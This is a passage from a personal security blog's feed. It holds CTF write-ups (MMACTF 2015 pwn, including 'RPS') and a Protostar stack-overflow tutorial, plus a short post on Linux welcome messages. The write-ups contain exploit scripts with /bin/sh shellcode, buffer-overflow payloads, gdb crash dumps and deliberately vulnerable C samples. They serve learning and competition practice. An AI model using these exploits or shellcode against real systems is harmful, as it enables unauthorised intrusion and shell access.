+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/env python 2.7
+</span><span class='line'>
+</span><span class='line'>#from hexdump import hexdump
+</span><span class='line'>import socket
+</span><span class='line'>import telnetlib
+</span><span class='line'>import struct
+</span><span class='line'>
+</span><span class='line'>p = lambda x: struct.pack("I", x)
+</span><span class='line'>P = lambda x: struct.unpack("I", x)
+</span><span class='line'>q = lambda x: struct.pack("&lt;Q", x)
+</span><span class='line'>
+</span><span class='line'>def interact():
+</span><span class='line'>    t = telnetlib.Telnet()
+</span><span class='line'>    t.sock = s
+</span><span class='line'>    t.interact()
+</span><span class='line'>
+</span><span class='line'>def r_until(st, debug=False):
+</span><span class='line'>    ret = ""
+</span><span class='line'>    while st not in ret:
+</span><span class='line'>        lret = s.recv(8192)
+</span><span class='line'>        if debug and len(lret) &gt; 0:
+</span><span class='line'>            print lret
+</span><span class='line'>        ret += lret
+</span><span class='line'>    return ret
+</span><span class='line'>
+</span><span class='line'>if __name__ == '__main__':
+</span><span class='line'>    s = socket.create_connection(('54.173.98.115', '1259'))    
+</span><span class='line'>    data = s.recv(1024)
+</span><span class='line'>    addr = data[6:-1]
+</span><span class='line'>    
+</span><span class='line'>    shellcode =  "\x31\xc0\xb0\x30\x01\xc4\x30\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\xb0\xb0\xc0\xe8\x04\xcd\x80\xc0\xe8\x03\xcd\x80"
+</span><span class='line'>    junk = shellcode + '1' * (128 - len(shellcode))
+</span><span class='line'>
+</span><span class='line'>    payload = junk + p(0x475a31a5) + p(0x40501555) + "\x00" * 4 + p(0xf7fc8000) + "\x00" * 4 + p(int(addr, 16))
+</span><span class='line'>    s.send(payload + '\n')
+</span><span class='line'>    interact()</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Get your point !</p>
+
+<p><em>Thanks for the great help from my brother</em></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Write Up | MMACTF 2015 - Pwn - RPS]]></title>
+    <link href="http://tungpun.github.io/blog/2015/09/09/write-up--mmactf-2015-pwn-rps/"/>
+    <updated>2015-09-09T22:14:40+07:00</updated>
+    <id>http://tungpun.github.io/blog/2015/09/09/write-up--mmactf-2015-pwn-rps</id>
+    <content type="html"><![CDATA[<pre><code>Problem
+Win 50 games in a row!
+nc milkyway.chal.mmactf.link 1641
+</code></pre>
+
+<p><a href="http://assets.score.mmactf.link/attachments/rps.7z-5c18b372802c14abfec93c81a2cfdc5bac7f5aeeb16ad7404aace7ae25591c6e">rps.7z</a></p>
+
+<p>Try to overflow the input, I discover that with payload <code>'1' * 88 + myaddr</code> , I can control the EIP to myaddr</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ r &lt; data
+</span><span class='line'>Starting program: /root/MMACTF/rps/rps &lt; data
+</span><span class='line'>What's your name: Hi, 11111111111111111111111111111111111111111111111111111111111111111111111111111111111111114321ABCD
+</span><span class='line'>Let's janken
+</span><span class='line'>Game 1/50
+</span><span class='line'>Rock? Paper? Scissors? [RPS]Bye bye
+</span><span class='line'>
+</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'>[----------------------------------registers-----------------------------------]
+</span><span class='line'>RAX: 0x0
+</span><span class='line'>RBX: 0x0
+</span><span class='line'>RCX: 0x7ffff7b13f60 (&lt;__write_nocancel+7&gt;:      cmp    rax,0xfffffffffffff001)
+</span><span class='line'>RDX: 0x0
+</span><span class='line'>RSI: 0x7ffff7dd7780 --&gt; 0x0
+</span><span class='line'>RDI: 0x7ffff7dd6620 --&gt; 0xfbad2a84
+</span><span class='line'>RBP: 0x3131313131313131 ('11111111')
+</span><span class='line'>RSP: 0x7fffffffea78 ("4321ABCD")
+</span><span class='line'>RIP: 0x400ae2 (&lt;main+732&gt;:      ret)
+</span><span class='line'>R8 : 0x7ffff7dd7780 --&gt; 0x0
+</span><span class='line'>R9 : 0x7ffff7fed700 (0x00007ffff7fed700)
+</span><span class='line'>R10: 0x355
+</span><span class='line'>R11: 0x246
+</span><span class='line'>R12: 0x400710 (&lt;_start&gt;:        xor    ebp,ebp)
+</span><span class='line'>R13: 0x7fffffffeb50 --&gt; 0x1
+</span><span class='line'>R14: 0x0
+</span><span class='line'>R15: 0x0
+</span><span class='line'>EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+</span><span class='line'>[-------------------------------------code-------------------------------------]
+</span><span class='line'>   0x400ad7 &lt;main+721&gt;: call   0x4006e0 &lt;fflush@plt&gt;
+</span><span class='line'>   0x400adc &lt;main+726&gt;: mov    eax,0x0
+</span><span class='line'>   0x400ae1 &lt;main+731&gt;: leave
+</span><span class='line'>=&gt; 0x400ae2 &lt;main+732&gt;: ret
+</span><span class='line'>   0x400ae3:    nop    WORD PTR cs:[rax+rax*1+0x0]
+</span><span class='line'>   0x400aed:    nop    DWORD PTR [rax]
+</span><span class='line'>   0x400af0 &lt;__libc_csu_init&gt;:  push   r15
+</span><span class='line'>   0x400af2 &lt;__libc_csu_init+2&gt;:        mov    r15d,edi
+</span><span class='line'>[------------------------------------stack-------------------------------------]
+</span><span class='line'>0000| 0x7fffffffea78 ("4321ABCD")
+</span><span class='line'>0008| 0x7fffffffea80 --&gt; 0x7fffffffeb00 --&gt; 0x7fffffffeb58 --&gt; 0x7fffffffed88 ("/root/MMACTF/rps/rps")
+</span><span class='line'>0016| 0x7fffffffea88 --&gt; 0x7fffffffeb58 --&gt; 0x7fffffffed88 ("/root/MMACTF/rps/rps")
+</span><span class='line'>0024| 0x7fffffffea90 --&gt; 0x100000000
+</span><span class='line'>0032| 0x7fffffffea98 --&gt; 0x400806 (&lt;main&gt;:      push   rbp)
+</span><span class='line'>0040| 0x7fffffffeaa0 --&gt; 0x0
+</span><span class='line'>0048| 0x7fffffffeaa8 --&gt; 0xe764facb54c92eb8
+</span><span class='line'>0056| 0x7fffffffeab0 --&gt; 0x400710 (&lt;_start&gt;:    xor    ebp,ebp)
+</span><span class='line'>[------------------------------------------------------------------------------]
+</span><span class='line'>Legend: code, data, rodata, value
+</span><span class='line'>Stopped reason: SIGSEGV
+</span><span class='line'>0x0000000000400ae2 in main ()</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>But, the address of line printing &ldquo;Congrats&rdquo; message contains <strong>\x0a</strong> character.
+It is changed to other character when I push to the program.
+I also try injecting shellcode to postfix, but it doesn&rsquo;t work too.</p>
+
+<blockquote><p>Make it simple !</p></blockquote>
+
+<p>What about rand() ? Is it safe perfectly ?</p>
+
+<p>I pay attention to <code>seed</code> of rand function. Seem like it can be overflowed too :)</p>
+
+<p>Using gdb, i have where the name stored in memory</p>
+
+<p><img src="http://i.imgur.com/VjgdeOA.png" alt="name's address" /></p>
+
+<p>=> <code>$bp-0x50</code></p>
+
+<p>And <code>...seed</code></p>
+
+<p><img src="http://i.imgur.com/j93EyWq.png" alt="seed's address" /></p>
+
+<p>=> <code>$bp-0x20</code></p>
+
+<p>Calculate the length of payload:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0x50 - 0x20 = 0x30 ~ 48</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>So,</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>seed = 'AAAA'
+</span><span class='line'>payload = 'A' * 48 + seed</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Keep the <code>seed</code>, we try to brute force the result.
+I use this code:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/env python 2.7
+</span><span class='line'>
+</span><span class='line'>import socket
+</span><span class='line'>import telnetlib
+</span><span class='line'>import struct
+</span><span class='line'>
+</span><span class='line'>p = lambda x: struct.pack("I", x)
+</span><span class='line'>P = lambda x: struct.unpack("I", x)
+</span><span class='line'>q = lambda x: struct.pack("&lt;Q", x)
+</span><span class='line'>
+</span><span class='line'>def interact():
+</span><span class='line'>    t = telnetlib.Telnet()
+</span><span class='line'>    t.sock = s
+</span><span class='line'>    t.interact()
+</span><span class='line'>
+</span><span class='line'>def r_until(st, debug=False):
+</span><span class='line'>    ret = ""
+</span><span class='line'>    while st not in ret:
+</span><span class='line'>        lret = s.recv(8192)
+</span><span class='line'>        if debug and len(lret) &gt; 0:
+</span><span class='line'>            print lret
+</span><span class='line'>        ret += lret
+</span><span class='line'>    return ret
+</span><span class='line'>
+</span><span class='line'>def tryluck(s, c):
+</span><span class='line'>    s.send(c + '\n')
+</span><span class='line'>    result = s.recv(1024)    
+</span><span class='line'>    if 'win' in result:
+</span><span class='line'>        return True
+</span><span class='line'>    return False
+</span><span class='line'>
+</span><span class='line'>if __name__ == '__main__':
+</span><span class='line'>    correctAnswer = []
+</span><span class='line'>    guessAnswer = 0                                     # 0 for R, 1 for P, 2 for S 
+</span><span class='line'>    for sessionID in range(0, 1000):        
+</span><span class='line'>        s = socket.create_connection(('milkyway.chal.mmactf.link', '1641'))
+</span><span class='line'>        print r_until(':')
+</span><span class='line'>        name = "A" * 52                                 # 48 + 4    
+</span><span class='line'>        s.send(name + '\n')            
+</span><span class='line'>        gameID = 0    
+</span><span class='line'>        while True:          
+</span><span class='line'>            print '[+] sessionID:', sessionID, '        gameID:', (gameID+1)
+</span><span class='line'>            print '[+] correctAnswer', correctAnswer                        
+</span><span class='line'>            print r_until(']', debug=True)
+</span><span class='line'>
+</span><span class='line'>            if gameID + 1 &lt;= len(correctAnswer):        # I have saved result for this game
+</span><span class='line'>                s.send(correctAnswer[gameID] + '\n')
+</span><span class='line'>                result = s.recv(1024)
+</span><span class='line'>                print '[+] Result:', result            
+</span><span class='line'>            else:                                       # no result for this game exists
+</span><span class='line'>                if guessAnswer == 0:
+</span><span class='line'>                    answer = 'S'
+</span><span class='line'>                elif guessAnswer == 1:
+</span><span class='line'>                    answer = 'R'
+</span><span class='line'>                else:
+</span><span class='line'>                    answer = 'P'
+</span><span class='line'>
+</span><span class='line'>                if not tryluck(s, answer):
+</span><span class='line'>                    guessAnswer += 1                    # choose another answer
+</span><span class='line'>                    break     
+</span><span class='line'>
+</span><span class='line'>                correctAnswer.append(answer)            # win, record the answer
+</span><span class='line'>                guessAnswer = 0                                                        
+</span><span class='line'>
+</span><span class='line'>            gameID += 1</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Get flag: <code>MMA{treed_three_girls}</code></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Have Fun With Linux - Configure Welcome Message]]></title>
+    <link href="http://tungpun.github.io/blog/2015/08/12/have-fun-with-linux-configure-welcome-message/"/>
+    <updated>2015-08-12T01:53:19+07:00</updated>
+    <id>http://tungpun.github.io/blog/2015/08/12/have-fun-with-linux-configure-welcome-message</id>
+    <content type="html"><![CDATA[<p>Have you ever felt boring with your linux server&rsquo;s default message ?
+Do you wanna something like:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>
+</span><span class='line'>                              *********                                       
+</span><span class='line'>                         *******      **                                      
+</span><span class='line'>                    *****              **                                     
+</span><span class='line'>               ******       ****        **                                    
+</span><span class='line'>             ****    *                 ***                                    
+</span><span class='line'>           ****              ***   ***     **                                 
+</span><span class='line'>        * ***** ******                      **            ***                 
+</span><span class='line'>       ***            **********      ****   ***         ****                 
+</span><span class='line'>       **                     ****             **       **  *         ********
+</span><span class='line'>         ***                      ***      **  **      **** ***            ***
+</span><span class='line'>         *                           *****    ****   ***    ********          
+</span><span class='line'>         *****                          ***     ***  ***   *** **             
+</span><span class='line'>           **   ******** ***********    ** ***   **  **       **   ****       
+</span><span class='line'>            ****                       **    ***  *  *** *****   *********    
+</span><span class='line'>             **                        **     *****   ***       **************
+</span><span class='line'>            **                        ***    **** *     ****   ***************
+</span><span class='line'>            **                        *        *      *****         **********
+</span><span class='line'>             **                      **     *** *****   **********************
+</span><span class='line'>              **                    **      **   ***********                 *
+</span><span class='line'>                *****              ***  ****               **            *   *
+</span><span class='line'>                     **************   *                     **          ******
+</span><span class='line'>                         **   *******                        ***** ******* ***
+</span><span class='line'>                        **  **************                       *************
+</span><span class='line'>                       ***  * ****** **  **                      *************
+</span><span class='line'>                       **   *******   *****                     **************
+</span><span class='line'>                       **   ** ** ********                     ******* * *****
+</span><span class='line'>                      ******************                       *  ****  ******
+</span><span class='line'>     #TungPun          *****   *******                         ********** ****
+</span><span class='line'>                      **       **   **                         ** ************
+</span><span class='line'> *  *  *  *  ** ** *****************************  **** ***********************
+</span><span class='line'>                   *       ***   **      *************************************
+</span><span class='line'>      **                                 *        **  **** ********** ********
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>:::::::::  :::    ::: ::::    :::     :::     :::::::::   ::::::::  :::    :::
+</span><span class='line'>:+:    :+: :+:    :+: :+:+:   :+:   :+: :+:   :+:    :+: :+:    :+: :+:    :+:
+</span><span class='line'>+:+    +:+ +:+    +:+ :+:+:+  +:+  +:+   +:+  +:+    +:+ +:+        +:+    +:+
+</span><span class='line'>+#++:++#+  +#+    +:+ +#+ +:+ +#+ +#++:++#++: +#++:++#:  +#+        +#++:++#++
+</span><span class='line'>+#+        +#+    +#+ +#+  +#+#+# +#+     +#+ +#+    +#+ +#+        +#+    +#+
+</span><span class='line'>#+#        #+#    #+# #+#   #+#+# #+#     #+# #+#    #+# #+#    #+# #+#    #+#
+</span><span class='line'>###         ########  ###    #### ###     ### ###    ###  ########  ###    ###
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Prepare a ascii art which you like then echo it to <code>/etc/motd</code> (message of the day).
+All done~ Restart your session and enjoy :D</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Hello Pwnable, Protostar Stack0~5]]></title>
+    <link href="http://tungpun.github.io/blog/2015/08/11/hello-pwnable/"/>
+    <updated>2015-08-11T18:53:34+07:00</updated>
+    <id>http://tungpun.github.io/blog/2015/08/11/hello-pwnable</id>
+    <content type="html"><![CDATA[<p>On my summer holiday, I have spent a couple of day to learn pwnable at  <a href="https://exploit-exercises.com/protostar/">protostar</a> where has interesting challenges. With newbie, i believe that if you try to follow from Stack 0 to Stack 5 (i wanna more, but now i haven&rsquo;t finished all of them), you will got steady base about Stack and have plan to dig deeper for the Buffer over Flow technique in the future.</p>
+
+<p>After reading my previous articles, you know my English is too terrible. I will try with my best, and blogging is one of my efforts to improve my English.</p>
+
+<p>Here we go,</p>
+
+<h2>STACK 0</h2>
+
+<p>This is the first (easiest, too) level. They&rsquo;ve given us a piece of code:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/* stack0.c */
+</span><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>#include &lt;unistd.h&gt;
+</span><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>
+</span><span class='line'>int main(int argc, char **argv)
+</span><span class='line'>{
+</span><span class='line'>  volatile int modified;
+</span><span class='line'>  char buffer[64];
+</span><span class='line'>
+</span><span class='line'>  modified = 0;
+</span><span class='line'>  gets(buffer);
+</span><span class='line'>
+</span><span class='line'>  if(modified != 0) {
+</span><span class='line'>      printf("you have changed the 'modified' variable\n");
+</span><span class='line'>  } else {
+</span><span class='line'>      printf("Try again?\n");
+</span><span class='line'>  }
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Our goal is modify <strong>modified</strong>&rsquo;s value through <strong>gets(buffer)</strong> function. &ldquo;Sound fabulous, how can i change this variable&rsquo;s value when i cant touch it ?&rdquo;. However, when you use <a href="http://www.gnu.org/software/gdb/">gdb</a> to debug that file, you will recognize that <strong>buffer</strong>&rsquo;s address is just below <strong>modified</strong>&rsquo;s address in STACK. So, if we overload the <strong>buffer</strong>, the leftover will overwrite <strong>modified</strong> => the payload we need in this level is a string contains 70 * <strong>A</strong> (try more if you want).</p>
+
+<h2>STACK 1</h2>
+
+<p>In this challenge, we have a code which is much the same as previous one.</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/* stack1.c */
+</span><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>#include &lt;unistd.h&gt;
+</span><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;string.h&gt;
+</span><span class='line'>
+</span><span class='line'>int main(int argc, char **argv)
+</span><span class='line'>{
+</span><span class='line'>  volatile int modified;
+</span><span class='line'>  char buffer[64];
+</span><span class='line'>
+</span><span class='line'>  if(argc == 1) {
+</span><span class='line'>      errx(1, "please specify an argument\n");
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>  modified = 0;
+</span><span class='line'>  strcpy(buffer, argv[1]);
+</span><span class='line'>
+</span><span class='line'>  if(modified == 0x61626364) {
+</span><span class='line'>      printf("you have correctly got the variable to the right value\n");
+</span><span class='line'>  } else {
+</span><span class='line'>      printf("Try again, you got 0x%08x\n", modified);
+</span><span class='line'>  }
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Not only overload <strong>buffer</strong>, we need make <strong>modified</strong>&rsquo;s value same as <strong>0x61626364</strong> (equal to <strong>dcba</strong> in ascii).
+Cuz the execute environment belongs to Little Endiance system, so you must <strong>pack(&lsquo;&lt;I&rsquo;, targetvalue)</strong></p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>payload = 64 * 'A' + pack('&lt;I", '0x61626364')
+</span><span class='line'>        = 64 * 'A' + '\x64\x63\x62\x61'</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<h2>STACK 2</h2>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/* stack2.c */
+</span><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>#include &lt;unistd.h&gt;
+</span><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;string.h&gt;
+</span><span class='line'>
+</span><span class='line'>int main(int argc, char **argv)
+</span><span class='line'>{
+</span><span class='line'>  volatile int modified;
+</span><span class='line'>  char buffer[64];
+</span><span class='line'>  char *variable;
+</span><span class='line'>
+</span><span class='line'>  variable = getenv("GREENIE");
+</span><span class='line'>
+</span><span class='line'>  if(variable == NULL) {
+</span><span class='line'>      errx(1, "please set the GREENIE environment variable\n");
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>  modified = 0;
+</span><span class='line'>
+</span><span class='line'>  strcpy(buffer, variable);
+</span><span class='line'>
+</span><span class='line'>  if(modified == 0x0d0a0d0a) {
+</span><span class='line'>      printf("you have correctly modified the variable\n");
+</span><span class='line'>  } else {
+</span><span class='line'>      printf("Try again, you got 0x%08x\n", modified);
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Instead of reading buffer from keyboard, this level require <code>GREENIE</code> environment variable. We use <code>export</code> command in Linux</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>➜  GREENIE=`python2 -c 'print "A" * 64 + "\x0a\x0d\x0a\x0d"'`
+</span><span class='line'>➜  export GREENIE
+</span><span class='line'>➜  ./stack2
+</span><span class='line'>you have correctly modified the variable</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<h2>STACK 3</h2>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/* stack3.c */
+</span><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>#include &lt;unistd.h&gt;
+</span><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;string.h&gt;
+</span><span class='line'>
+</span><span class='line'>void win()
+</span><span class='line'>{
+</span><span class='line'>  printf("code flow successfully changed\n");
+</span><span class='line'>}
+</span><span class='line'>
+</span><span class='line'>int main(int argc, char **argv)
+</span><span class='line'>{
+</span><span class='line'>  volatile int (*fp)();
+</span><span class='line'>  char buffer[64];
+</span><span class='line'>
+</span><span class='line'>  fp = 0;
+</span><span class='line'>
+</span><span class='line'>  gets(buffer);
+</span><span class='line'>
+</span><span class='line'>  if(fp) {
+</span><span class='line'>      printf("calling function pointer, jumping to 0x%08x\n", fp);
+</span><span class='line'>      fp();
+</span><span class='line'>  }
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>In the end of this piece of code, the program call the function which has address stored in <code>fp</code> &rsquo;s value. So, how to force the program to call <code>win</code> function ? The first thought is overwrite <code>win</code> &rsquo;s address to <code>fp</code> value.</p>
+
+<p>But, what is <code>win</code>&rsquo;s address ?</p>
+
+<p>Using gdb (with <a href="https://github.com/longld/peda">peda</a>) we have:</p>
+
